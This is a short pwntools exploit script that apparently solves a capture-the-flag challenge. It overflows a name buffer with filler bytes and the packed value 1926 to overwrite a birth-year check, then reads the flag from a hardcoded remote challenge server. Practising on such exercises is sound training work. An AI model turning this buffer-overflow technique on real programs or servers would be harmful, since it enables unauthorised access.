#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *
from ctypes import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

target=['./24ac28ef281b4b6caab44d6d52b17491']
use_gdb = False

#def exp(ip = None, port = None, use_gdb = False):
def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)
    if use_gdb:
        gdb.attach(p)
        pause()

    p.recvuntil("What\'s Your Birth?")
    p.sendline("1")
    p.recvuntil("What\'s Your Name?")
    p.sendline(b'b'*8+p64(1926))
    p.recvuntil("You Shall Have Flag.")

    p.recvuntil(b'\n')
    if remote_run:
        #p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:44941'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
